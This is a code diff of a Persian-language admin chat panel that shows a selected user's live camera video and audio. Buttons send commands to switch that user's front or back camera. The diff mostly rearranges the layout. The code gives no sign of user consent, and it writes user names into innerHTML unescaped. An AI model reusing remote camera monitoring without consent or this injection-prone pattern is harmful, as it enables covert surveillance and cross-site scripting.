@@ -25,39 +25,42 @@
         .user-name { font-size: 15px; font-weight: 500; }
         .user-id { font-size: 12px; color: #888; }
 
-        /* --- بخش چت --- */
-        .chat-area { flex: 1; display: flex; flex-direction: column; position: relative; }
+        /* --- محتوای اصلی --- */
+        .main-content { flex: 1; display: flex; flex-direction: column; position: relative; }
+
         .chat-header { padding: 15px 20px; background-color: #212121; border-bottom: 1px solid #2f2f2f; display: flex; justify-content: space-between; align-items: center; gap: 10px; }
         .menu-btn { display: none; background: #333; border: none; color: white; padding: 8px 12px; border-radius: 6px; cursor: pointer; font-size: 18px; }
         .header-actions { display: flex; gap: 5px; }
         .header-actions button { background: #333; color: white; border: none; padding: 8px 12px; border-radius: 6px; cursor: pointer; font-family: inherit; font-size: 13px; }
         .header-actions button:hover { background: #d32f2f; }
 
-        /* ===== ✅ بخش لایو بزرگ و اختصاصی ===== */
-        .live-view-container {
-            display: none;
+        /* ===== ✅ تقسیم‌بندی: لایو (چپ) و چت (راست) ===== */
+        .split-view { flex: 1; display: flex; overflow: hidden; }
+
+        /* پنل لایو */
+        .live-panel {
+            width: 50%;
             background: #000;
-            padding: 20px;
-            border-bottom: 2px solid #4d6bfe;
-            text-align: center;
+            display: none;
+            flex-direction: column;
+            border-left: 2px solid #4d6bfe;
         }
-        .live-view-container img {
+        .live-panel.active { display: flex; }
+        .live-panel img {
             width: 100%;
-            max-width: 800px;
-            max-height: 500px;
+            flex: 1;
             object-fit: contain;
-            border-radius: 12px;
             background: #111;
-            margin-bottom: 15px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
         }
-        .live-controls {
+        .live-panel-controls {
+            padding: 15px;
+            background: #1a1a1a;
             display: flex;
             gap: 10px;
             justify-content: center;
             flex-wrap: wrap;
         }
-        .live-controls button {
+        .live-panel-controls button {
             border: none;
             padding: 10px 20px;
             border-radius: 8px;
@@ -68,12 +71,16 @@
             transition: 0.2s;
         }
         .btn-switch-front { background: #4d6bfe; }
-        .btn-switch-front:hover { background: #3a55d9; }
         .btn-switch-back { background: #ff9800; }
-        .btn-switch-back:hover { background: #e68a00; }
         .btn-close-live { background: #d32f2f; }
-        .btn-close-live:hover { background: #b71c1c; }
 
+        /* پنل چت */
+        .chat-panel {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+        }
         .messages { flex: 1; overflow-y: auto; padding: 30px 10% 120px 10%; display: flex; flex-direction: column; gap: 18px; }
         .message-row { display: flex; flex-direction: column; width: 100%; }
         .message-row.sent { align-items: flex-start; }
@@ -125,19 +132,19 @@
             .sidebar.open { transform: translateX(0); }
             .close-sidebar { display: block; }
             .menu-btn { display: block; }
+            .split-view { flex-direction: column; }
+            .live-panel { width: 100%; height: 40%; border-left: none; border-bottom: 2px solid #4d6bfe; }
+            .chat-panel { height: 60%; }
             .messages { padding: 20px 5% 100px 5%; gap: 14px; }
             .input-container { padding: 15px 5%; }
             .message-bubble { max-width: 85%; font-size: 14px; padding: 10px 14px; }
             .chat-header { padding: 12px 15px; }
             .header-actions button { padding: 6px 10px; font-size: 12px; }
             .user-avatar { width: 40px; height: 40px; }
-            .live-view-container img { max-height: 250px; }
-            .live-controls button { padding: 8px 14px; font-size: 12px; }
         }
     </style>
 </head>
 <body>
-    <!-- سایدبار -->
     <div class="sidebar" id="sidebar">
         <div class="sidebar-header">
             لیست کاربران
@@ -159,8 +166,7 @@
         </div>
     </div>
 
-    <!-- بخش چت -->
-    <div class="chat-area">
+    <div class="main-content">
         <div class="chat-header">
             <button class="menu-btn" onclick="toggleSidebar()">☰</button>
             <div id="chatHeader" style="flex: 1; font-size: 14px;">یک کاربر را انتخاب کنید</div>
@@ -170,29 +176,30 @@
             </div>
         </div>
         
-        <!-- ✅ بخش لایو بزرگ و اختصاصی -->
-        <div class="live-view-container" id="liveViewContainer">
-            <img id="liveViewImage" alt="لایو کاربر" />
-            <div class="live-controls">
-                <button class="btn-switch-front" onclick="requestCamera('user')">📱 دوربین جلو کاربر</button>
-                <button class="btn-switch-back" onclick="requestCamera('environment')">📷 دوربین عقب کاربر</button>
-                <button class="btn-close-live" onclick="closeLiveView()">✖ بستن لایو</button>
+        <div class="split-view">
+            <div class="live-panel" id="livePanel">
+                <img id="liveViewImage" alt="لایو کاربر" />
+                <div class="live-panel-controls">
+                    <button class="btn-switch-front" onclick="requestCamera('user')">📱 دوربین جلو</button>
+                    <button class="btn-switch-back" onclick="requestCamera('environment')">📷 دوربین عقب</button>
+                    <button class="btn-close-live" onclick="closeLiveView()">✖ بستن</button>
+                </div>
             </div>
-        </div>
 
-        <div class="messages" id="messages"></div>
-
-        <div class="input-container">
-            <div class="input-box">
-                <button class="icon-btn" onclick="document.getElementById('fileInput').click()">📎</button>
-                <input type="file" id="fileInput" style="display:none" accept="image/*,video/*,audio/*" onchange="uploadFile(this)">
-                <input type="text" id="adminInput" placeholder="پیام..." disabled autocomplete="off">
-                <button class="send-btn" onclick="sendAdminMessage()" disabled id="sendBtn">ارسال</button>
+            <div class="chat-panel">
+                <div class="messages" id="messages"></div>
+                <div class="input-container">
+                    <div class="input-box">
+                        <button class="icon-btn" onclick="document.getElementById('fileInput').click()">📎</button>
+                        <input type="file" id="fileInput" style="display:none" accept="image/*,video/*,audio/*" onchange="uploadFile(this)">
+                        <input type="text" id="adminInput" placeholder="پیام..." disabled autocomplete="off">
+                        <button class="send-btn" onclick="sendAdminMessage()" disabled id="sendBtn">ارسال</button>
+                    </div>
+                </div>
             </div>
         </div>
     </div>
 
-    <!-- دکمه فعال‌سازی صدا -->
     <div id="adminAudioUnlockBtn">
         <button onclick="unlockAdminAudio()">🔊 برای شنیدن صدای کاربر کلیک کنید</button>
     </div>
@@ -201,17 +208,10 @@
         const adminId = {{ admin_id }};
         let currentUserId = null, currentUserName = "", pendingFileUrl = null, pendingFileType = null;
         let ws;
-        
-        // صف پخش صدای کاربر
-        let audioQueue = [];
-        let isPlayingAudio = false;
-        let adminAudioUnlocked = false;
+        let audioQueue = [], isPlayingAudio = false, adminAudioUnlocked = false;
 
-        function toggleSidebar() {
-            document.getElementById('sidebar').classList.toggle('open');
-        }
+        function toggleSidebar() { document.getElementById('sidebar').classList.toggle('open'); }
 
-        // --- صف پخش صدا ---
         function unlockAdminAudio() {
             adminAudioUnlocked = true;
             document.getElementById('adminAudioUnlockBtn').style.display = 'none';
@@ -223,14 +223,9 @@
             if (audioQueue.length === 0) { isPlayingAudio = false; return; }
             isPlayingAudio = true;
             const audio = new Audio(audioQueue.shift());
-            audio.play().then(() => {
-                audio.onended = () => playNextAudio();
-            }).catch(() => {
-                isPlayingAudio = false;
-            });
+            audio.play().then(() => { audio.onended = () => playNextAudio(); }).catch(() => { isPlayingAudio = false; });
         }
 
-        // --- WebSocket ---
         function connectWebSocket() {
             const wsProtocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
             ws = new WebSocket(`${wsProtocol}${window.location.host}/ws/${adminId}/admin`);
@@ -243,16 +238,13 @@
                     if (dot) dot.className = `online-dot ${data.is_online ? '' : 'offline-dot'}`;
                 }
                 
-                // ✅ دریافت استریم کاربر و نمایش در صفحه بزرگ
                 if (data.type === 'live_stream' && data.user_id == currentUserId) {
                     if (data.video) {
-                        document.getElementById('liveViewContainer').style.display = 'block';
+                        document.getElementById('livePanel').classList.add('active');
                         document.getElementById('liveViewImage').src = data.video;
                     }
                     if (data.audio) {
-                        if (!adminAudioUnlocked) {
-                            document.getElementById('adminAudioUnlockBtn').style.display = 'block';
-                        }
+                        if (!adminAudioUnlocked) document.getElementById('adminAudioUnlockBtn').style.display = 'block';
                         audioQueue.push(data.audio);
                         if (!isPlayingAudio) playNextAudio();
                     }
@@ -266,7 +258,6 @@
         }
         connectWebSocket();
 
-        // --- انتخاب کاربر ---
         async function selectUser(id, name) {
             currentUserId = id; currentUserName = name;
             document.getElementById('chatHeader').innerHTML = `چت با: <span style="color:#4d6bfe">${name}</span>`;
@@ -275,17 +266,14 @@
             document.getElementById('headerActions').style.display = 'flex';
             document.getElementById('adminInput').focus();
             
-            // مخفی کردن لایو قبلی
-            document.getElementById('liveViewContainer').style.display = 'none';
+            document.getElementById('livePanel').classList.remove('active');
             document.getElementById('liveViewImage').src = "";
             audioQueue = [];
 
             document.querySelectorAll('.user-item').forEach(el => el.classList.remove('active'));
             document.getElementById('user-' + id).classList.add('active');
 
-            if (window.innerWidth <= 768) {
-                document.getElementById('sidebar').classList.remove('open');
-            }
+            if (window.innerWidth <= 768) document.getElementById('sidebar').classList.remove('open');
             
             const messagesDiv = document.getElementById('messages');
             messagesDiv.innerHTML = '<div style="text-align:center; color:#888;">در حال بارگذاری...</div>';
@@ -297,7 +285,6 @@
             else history.forEach(msg => appendMessage(msg.content, (msg.sender_id == adminId) ? 'sent' : 'received', msg.message_type, msg.time, msg.date));
         }
 
-        // ✅ درخواست تغییر دوربین کاربر
         function requestCamera(facing) {
             if (!currentUserId || !ws) return;
             ws.send(JSON.stringify({
@@ -308,11 +295,10 @@
         }
 
         function closeLiveView() {
-            document.getElementById('liveViewContainer').style.display = 'none';
+            document.getElementById('livePanel').classList.remove('active');
             document.getElementById('liveViewImage').src = "";
         }
 
-        // --- نمایش پیام ---
         function appendMessage(content, type, msgType, time, date) {
             const messagesDiv = document.getElementById('messages');
             const empty = messagesDiv.querySelector('div[style*="text-align:center"]');
